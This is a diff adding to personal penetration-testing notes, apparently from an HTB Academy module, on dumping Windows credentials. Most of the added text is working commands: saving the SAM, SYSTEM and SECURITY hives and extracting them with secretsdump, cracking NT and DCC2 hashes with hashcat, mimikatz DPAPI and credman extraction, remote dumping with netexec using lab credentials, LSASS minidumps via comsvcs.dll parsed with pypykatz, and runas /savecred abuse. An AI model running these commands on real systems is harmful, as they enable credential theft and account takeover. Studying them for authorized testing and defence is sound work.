@@ -101,8 +101,53 @@ creds search cisco  //search
 LSASS: Local Security authoriry subsystem service: authenticates users, manages local logins, users to SID   
 SAM(Security account manager) database: stores LM or NTLM hashes, C:\system32\SAM, system priv  
 AD database of creds: %SystemRoot%\ntds.dit  
-Credential manager: built-in win featyre to store/manage creds for web,apps,network  
+*Credential manager*: built-in win featyre to store/manage creds for web,apps,network  
 C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\  //for every user  
+
+**Local dumping**: say with shell to windows system..  
+Registry hives: copy these and extract pass using secretsdump  
+HKLM\SAM: sam db  
+HKLM\SYSTEM: key that encrypts SAM  
+HKLM\SECURITY: cached domain and cleartext pass used by LSA  
+
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\system C:\system.save
+reg.exe save hklm\security C:\security.save
+
+impacket-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL //dumps creds from all 3 hives  
+Copy just the NT hash(2nd part) and crack it using hashcat  
+sudo hashcat -m 1000 nthashes.txt /usr/share/wordlists/rockyou.txt  
+hklm\security contains cached domain logon information, specifically in the form of DCC2 hashes, more diff to crack and can;t be used for PTH..  
+hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt  
+
+DPAPI creds used by credential manager, browsers to encrypt saved creds, can also be cracked using mimikatz  
+C:\Users\Public> mimikatz.exe  
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect  
+
+**Remote dumping**: with creds..  try both crackmapexec and secretsdump  
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa  //lsa  
+netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam  //sam  
+secretsdump.py DOMAIN/user:Password123@192.168.1.10  //no domain for local accounts  
+
+Attacking LSASS: just like we manually extracted SAM, can do lsass dump save it and crack offline with pypikatz  
+with powershell find the pid and dump it with rundll32..  
+Get-Process lsass  
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp   
+//this is manual, better use secretsdump or crackmapexec or mimikatz  
+
+**Attacking windows credential manager**:
+cmdkey /list //cmd //creds stored in current user profile  
+runas /savecred /user:SRV01\mcharles cmd  //if any domain interactive creds found, can switch to using runas  
+With mimikatz..  reveaks pass hash as welll //mimikatz requires admin, so first imperosnate then run mimikatz or Lazagne creds manager stealer       
+mimikatz.exe  
+privilege::debug  
+sekurlsa::credman  
+Lasagne is much simpler, jsut run exe - reveals cleartext pass..  
+
+
+
+
 
 
 
